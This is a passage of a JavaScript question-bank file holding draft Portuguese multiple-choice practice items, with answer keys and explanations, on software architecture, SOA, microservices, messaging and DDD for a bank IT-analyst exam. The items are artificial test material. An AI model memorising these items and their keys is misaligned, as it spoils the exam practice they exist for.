  "enunciado": "Em uma arquitetura multicamadas física de três níveis (*3-tier*) típica de aplicações web, os níveis correspondem, respectivamente, a",
  "imagem": null,
  "alternativas": {
    "A": "navegador do cliente, servidor de aplicação e servidor de banco de dados.",
    "B": "controlador, modelo e visão, executados no mesmo processo.",
    "C": "cliente gordo com regras de negócio, servidor de arquivos e SGBD.",
    "D": "API Gateway, service mesh e sidecar.",
    "E": "camada física, camada de enlace e camada de rede."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** No **3 tier** clássico da web: navegador (apresentação), servidor de aplicação (lógica) e servidor de banco (dados).\n\n(B) MVC é padrão lógico de interface, não divisão física em tiers. (C) Cliente gordo + SGBD caracteriza o 2 tier. (D) São componentes de infraestrutura de microsserviços. (E) São camadas do modelo OSI.\n\nRevisar: Apostila 06, §9.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V017",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §9.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Ao migrar de uma arquitetura cliente-servidor de duas camadas (cliente gordo acessando o SGBD) para uma arquitetura de três camadas físicas, uma vantagem esperada é",
  "imagem": null,
  "alternativas": {
    "A": "eliminar a necessidade de rede entre cliente e servidor.",
    "B": "dispensar o controle de concorrência no banco de dados.",
    "C": "garantir que nenhuma regra de negócio precise ser testada.",
    "D": "centralizar a lógica no servidor de aplicação, facilitando atualizações e permitindo escalar essa camada independentemente.",
    "E": "obrigar que todas as camadas sejam escritas na mesma linguagem."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Com a lógica no servidor de aplicação, uma mudança de regra não exige redistribuir o cliente, e a camada intermediária pode ser replicada/escalada sem mexer no banco.\n\n(A) A comunicação continua sendo pela rede. (B) Concorrência no banco continua necessária. (C) Testes continuam necessários. (E) As camadas podem usar tecnologias diferentes.\n\nRevisar: Apostila 06, §9.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V018",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §9.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma arquitetura de objetos distribuídos (como Java RMI ou CORBA), o cliente invoca métodos de um objeto remoto como se ele fosse local. O componente do lado cliente que implementa a mesma interface do objeto remoto, empacota (*marshalling*) os parâmetros e os envia pela rede é o",
  "imagem": null,
  "alternativas": {
    "A": "skeleton.",
    "B": "stub, que atua como proxy remoto.",
    "C": "registro de serviços UDDI.",
    "D": "adaptador primário da arquitetura hexagonal.",
    "E": "message broker."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **stub** é o **proxy remoto** do lado cliente: tem a mesma interface do objeto, faz o marshalling e envia a chamada. É uma aplicação do padrão Proxy (proxy remoto) citado na apostila.\n\n(A) O skeleton fica do lado **servidor**, desempacota a chamada e invoca o objeto real. (C) UDDI é registro de Web Services SOAP. (D) Adaptador primário é conceito da arquitetura hexagonal. (E) O broker intermedeia mensagens assíncronas, não representa um objeto remoto.\n\nRevisar: Apostila 06, §9.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V019",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
  "ref_apostila": {
    "modulo": "06",
    "secao": "10",
    "titulo": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#10. Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §10.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Entre os princípios de projeto de serviços em SOA propostos por Thomas Erl, aquele segundo o qual o serviço deve minimizar a retenção de informações entre uma requisição e outra é o princípio da",
  "imagem": null,
  "alternativas": {
    "A": "autonomia.",
    "B": "abstração.",
    "C": "composição.",
    "D": "descoberta.",
    "E": "ausência de estado (statelessness)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** **Ausência de estado** (statelessness): o serviço minimiza a retenção de estado entre requisições, o que favorece escalabilidade e reúso.\n\n(A) Autonomia: o serviço controla seu ambiente e sua lógica. (B) Abstração: o contrato expõe só o essencial. (C) Composição: serviços podem ser combinados em serviços maiores. (D) Descoberta: metadados permitem encontrar o serviço.\n\nRevisar: Apostila 06, §10.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V020",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
  "ref_apostila": {
    "modulo": "06",
    "secao": "10",
    "titulo": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#10. Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §10.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Considere dois desenhos de integração de serviços: no primeiro, um processo central escrito em WS-BPEL controla a ordem e a lógica das chamadas; no segundo, não há coordenador central, e cada serviço reage às mensagens que recebe e sabe com quem interagir. Esses desenhos correspondem, respectivamente, a",
  "imagem": null,
  "alternativas": {
    "A": "coreografia e orquestração.",
    "B": "orquestração e coreografia.",
    "C": "ESB e UDDI.",
    "D": "saga coreografada e commit em duas fases.",
    "E": "publicação e descoberta no registro de serviços."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **Orquestração** = coordenador central (WS-BPEL); **coreografia** = controle distribuído, sem coordenador (WS-CDL).\n\n(A) Inverte os conceitos, pegadinha comum. (C) ESB é barramento de integração e UDDI é registro de serviços. (D) 2PC é protocolo de transação distribuída, não estilo de composição. (E) Publicar e descobrir são operações do triângulo SOA, não desenhos de composição.\n\nRevisar: Apostila 06, §10.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V021",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
  "ref_apostila": {
    "modulo": "06",
    "secao": "10",
    "titulo": "Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#10. Interoperabilidade: SOA, Web Services, XML, XSLT, WSDL, SOAP, UDDI, REST e HTTP]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §10.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma arquitetura SOA corporativa, o componente que faz roteamento de mensagens, transformação de formatos (por exemplo, com XSLT), conversão de protocolos e mediação entre sistemas heterogêneos é o",
  "imagem": null,
  "alternativas": {
    "A": "ESB (Enterprise Service Bus).",
    "B": "service mesh.",
    "C": "API Gateway do tipo BFF.",
    "D": "balanceador de carga de camada 4.",
    "E": "registro de serviços Eureka."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **ESB** é o barramento \"inteligente\" típico da SOA: roteamento, transformação, conversão de protocolos e mediação.\n\n(B) Service mesh cuida da comunicação serviço a serviço em microsserviços, sem transformar mensagens de negócio. (C) O BFF é um gateway por tipo de front-end. (D) Balanceador L4 distribui conexões TCP/UDP, sem entender o conteúdo. (E) Eureka é registro para descoberta de serviços.\n\nRevisar: Apostila 06, §10.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V022",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.9",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Comparando a SOA tradicional com a arquitetura de microsserviços, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "a SOA usa canais burros e endpoints inteligentes, enquanto os microsserviços dependem de um ESB inteligente.",
    "B": "os microsserviços privilegiam um banco de dados compartilhado por todos os serviços, ao passo que a SOA exige banco por serviço.",
    "C": "a SOA tem foco na integração no nível da empresa, com governança mais centralizada, e os microsserviços estruturam uma aplicação em serviços menores com governança descentralizada.",
    "D": "microsserviços só podem se comunicar por SOAP e WS-*.",
    "E": "a SOA proíbe o reúso de serviços entre processos de negócio."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** SOA: escopo corporativo, ESB, serviços maiores, governança centralizada. Microsserviços: arquitetura de uma aplicação, serviços menores, banco por serviço, governança descentralizada.\n\n(A) Está invertido: o ESB é da SOA; microsserviços usam canais burros. (B) Também invertido: em SOA é comum dado compartilhado; em microsserviços, banco por serviço. (D) Microsserviços usam REST/JSON, gRPC e eventos. (E) Reusabilidade é princípio da SOA.\n\nRevisar: Apostila 06, §11.9.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V023",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na mensageria entre microsserviços, a mensagem *ContaAberta*, publicada pelo serviço de Contas para que quaisquer serviços interessados (Cartões, Marketing, Antifraude) reajam, sem que o emissor os conheça, é um exemplo de",
  "imagem": null,
  "alternativas": {
    "A": "comando, enviado a um único destinatário para que execute uma ação.",
    "B": "consulta síncrona do tipo requisição-resposta.",
    "C": "chamada RPC com acoplamento temporal.",
    "D": "transação de compensação de uma saga orquestrada.",
    "E": "evento de domínio, distribuído no modelo publish/subscribe."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Um **evento** notifica que algo **aconteceu** e pode ter vários interessados (publish/subscribe); o emissor não conhece os consumidores — base da arquitetura orientada a eventos.\n\n(A) Comando **pede** que algo seja feito e tem um destinatário. (B) e (C) São interações síncronas, com acoplamento temporal. (D) Compensação desfaz uma etapa da saga; *ContaAberta* apenas informa um fato.\n\nRevisar: Apostila 06, §11.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V024",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco precisa distribuir as ordens de geração de boletos entre várias instâncias de um mesmo serviço, de modo que cada ordem seja processada por apenas uma instância; e, separadamente, avisar vários sistemas diferentes sempre que um boleto for pago. Os modelos de mensageria mais adequados são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "tópico publish/subscribe e fila ponto a ponto.",
    "B": "fila ponto a ponto (consumidores concorrentes) e tópico publish/subscribe.",
    "C": "chamada REST síncrona e fila ponto a ponto.",
    "D": "tópico publish/subscribe nos dois casos, sem grupos de consumidores.",
    "E": "commit em duas fases e chamada gRPC."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Na **fila ponto a ponto**, cada mensagem é entregue a **um** consumidor (consumidores concorrentes dividem a carga). No **tópico publish/subscribe**, cada assinante recebe sua cópia do evento.\n\n(A) Inverte os modelos. (C) REST síncrono não distribui trabalho assíncrono nem absorve picos. (D) Um tópico sem grupos de consumidores entregaria a mesma ordem a todas as instâncias, duplicando boletos. (E) 2PC e gRPC não são modelos de mensageria.\n\nRevisar: Apostila 06, §11.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V025",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Brokers de mensagens costumam oferecer entrega *pelo menos uma vez* (at-least-once), o que pode gerar mensagens duplicadas. Para que o consumidor que credita valores em conta não credite duas vezes a mesma transferência, a medida adequada é",
  "imagem": null,
  "alternativas": {
    "A": "tornar o consumidor idempotente, registrando o identificador de cada mensagem já processada e ignorando repetições.",
    "B": "aumentar o número de partições do tópico.",
    "C": "desativar as confirmações (ack) do consumidor.",
    "D": "trocar a fila por um tópico publish/subscribe.",
    "E": "aplicar retry com backoff exponencial no produtor."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** Com entrega at-least-once, o consumidor deve ser **idempotente**: processar a mesma mensagem duas vezes deve ter o mesmo efeito de processá-la uma vez (por exemplo, guardando o ID da mensagem).\n\n(B) Mais partições aumentam o paralelismo, não evitam duplicatas. (C) Sem ack, o broker reenviaria ainda mais. (D) Tópicos não eliminam duplicidade. (E) Retry no produtor pode até **gerar** duplicatas.\n\nRevisar: Apostila 06, §11.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V026",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em comparação com a comunicação síncrona por REST entre microsserviços, a comunicação assíncrona por filas e tópicos tem como vantagem",
  "imagem": null,
  "alternativas": {
    "A": "a resposta imediata ao chamador, com a mesma latência de uma chamada local.",
    "B": "a eliminação da consistência eventual.",
    "C": "a depuração mais simples, pois o fluxo fica todo em uma única chamada.",
    "D": "a garantia de que nenhuma mensagem será entregue em duplicidade.",
    "E": "o menor acoplamento temporal, já que o consumidor processa a mensagem quando estiver disponível, absorvendo picos."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** A mensageria reduz o **acoplamento temporal**: emissor e consumidor não precisam estar no ar ao mesmo tempo, e a fila absorve picos.\n\n(A) Resposta imediata é característica da comunicação síncrona. (B) A comunicação assíncrona costuma **introduzir** consistência eventual. (C) A depuração fica mais difícil. (D) Duplicidade é um dos contras da mensageria.\n\nRevisar: Apostila 06, §11.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V027",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No DDD (Domain-Driven Design), o termo \"Cliente\" tem significados diferentes nos contextos de Crédito (renda, score, limite) e de Marketing (preferências, campanhas). A fronteira dentro da qual um modelo e sua linguagem ubíqua são consistentes, e que costuma orientar a definição de um microsserviço, é o",
  "imagem": null,
  "alternativas": {
    "A": "agregado.",
    "B": "objeto de valor.",
    "C": "contexto delimitado (bounded context).",
    "D": "repositório.",
    "E": "serviço de domínio."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **contexto delimitado** é a fronteira de consistência de um modelo e de sua linguagem ubíqua; um bom microsserviço normalmente corresponde a um bounded context.\n\n(A) Agregado é um grupo de entidades tratado como unidade de consistência, dentro de um contexto. (B) Objeto de valor é definido pelos atributos, sem identidade própria. (D) Repositório abstrai a persistência de agregados. (E) Serviço de domínio abriga operações que não pertencem naturalmente a uma entidade.\n\nRevisar: Apostila 06, §11.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V028",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um modelo DDD de contratos de empréstimo, a entidade Contrato controla suas Parcelas: nenhuma parcela é alterada diretamente de fora, apenas por meio de operações do Contrato, que garante as regras de consistência do conjunto. Nesse desenho, Contrato é",
  "imagem": null,
  "alternativas": {
    "A": "um objeto de valor.",
    "B": "a raiz de um agregado.",
    "C": "um contexto delimitado.",
    "D": "uma camada anticorrupção.",
    "E": "um evento de domínio."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **agregado** é um grupo de entidades tratado como unidade de consistência; o acesso de fora passa pela **raiz do agregado** (aqui, Contrato).\n\n(A) Objeto de valor não tem identidade e é imutável; Contrato tem identidade. (C) Contexto delimitado é uma fronteira de modelo, maior que uma entidade. (D) Camada anticorrupção traduz modelos entre sistemas. (E) Evento de domínio registra um fato ocorrido.\n\nRevisar: Apostila 06, §11.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V029",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma plataforma de microsserviços, as instâncias sobem e descem com IPs variáveis. O serviço de Pagamentos consulta o registro de serviços, obtém a lista de instâncias saudáveis do serviço de Tarifas e ele próprio escolhe, com balanceamento local, a instância que vai chamar. Essa abordagem é a",
  "imagem": null,
  "alternativas": {
    "A": "descoberta do lado do servidor (server-side discovery).",
    "B": "configuração estática de IPs no código.",
    "C": "resolução de nomes por arquivo hosts.",
    "D": "descoberta do lado do cliente (client-side discovery).",
    "E": "agregação de respostas pelo API Gateway."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Na **descoberta no cliente**, o próprio cliente consulta o registro (Eureka, Consul) e escolhe a instância (balanceamento no cliente).\n\n(A) Na descoberta no servidor, o cliente chama um balanceador/roteador, que consulta o registro. (B) e (C) IP fixo ou arquivo hosts não acompanham instâncias dinâmicas. (E) Agregação de respostas é função do gateway, não descoberta.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V030",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §18.2",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No Kubernetes, o papel do registro de serviços em uma arquitetura de microsserviços é desempenhado nativamente por",
  "imagem": null,
  "alternativas": {
    "A": "ConfigMaps montados em cada pod.",
    "B": "o objeto Service e o DNS interno do cluster, que dão nome e endereço estáveis a um conjunto de pods.",
    "C": "volumes persistentes compartilhados entre os nós.",
    "D": "o Horizontal Pod Autoscaler.",
    "E": "o arquivo Dockerfile de cada imagem."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** No Kubernetes, o **Service** e o **DNS interno** fazem a descoberta: dão endereço estável e balanceamento para pods cujos IPs mudam.\n\n(A) ConfigMap guarda configuração. (C) Volumes guardam dados. (D) O HPA escala o número de pods. (E) O Dockerfile só constrói a imagem.\n\nRevisar: Apostila 06, §18.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V031",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma equipe configurou retries automáticos nas chamadas HTTP do aplicativo ao serviço de Pagamentos. Para que repetir uma requisição de pagamento após um timeout não gere cobranças em dobro, é necessário que",
  "imagem": null,
  "alternativas": {
    "A": "o retry seja feito imediatamente, sem intervalo, para reduzir a latência.",
    "B": "o número de tentativas seja ilimitado.",
    "C": "a operação seja idempotente, por exemplo com uma chave de idempotência enviada no cabeçalho da requisição.",
    "D": "o timeout seja removido, esperando a resposta indefinidamente.",
    "E": "as respostas de erro 4xx também sejam repetidas."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Retry exige operação **idempotente**: com uma chave de idempotência, o servidor reconhece a repetição e devolve o resultado já processado.\n\n(A) Repetir sem intervalo agrava a sobrecarga; recomenda-se backoff exponencial com jitter. (B) Tentativas devem ser limitadas. (D) Nunca se espera indefinidamente: timeout é obrigatório. (E) Erros 4xx indicam problema na requisição e normalmente não devem ser repetidos.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V032",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um cliente HTTP chama o serviço de Cotações com timeout de 2 s por tentativa. Em caso de falha, faz até 4 novas tentativas (além da primeira), com backoff exponencial sem jitter: espera 100 ms antes da 1ª repetição e dobra a espera a cada nova repetição. Se o serviço não responder em nenhuma tentativa (todas esgotam o timeout), o tempo total até o cliente desistir é de",
  "imagem": null,
  "alternativas": {
    "A": "8,0 s.",
    "B": "9,5 s.",
    "C": "10,0 s.",
    "D": "11,5 s.",
    "E": "13,1 s."
  },
  "gabarito": "D",
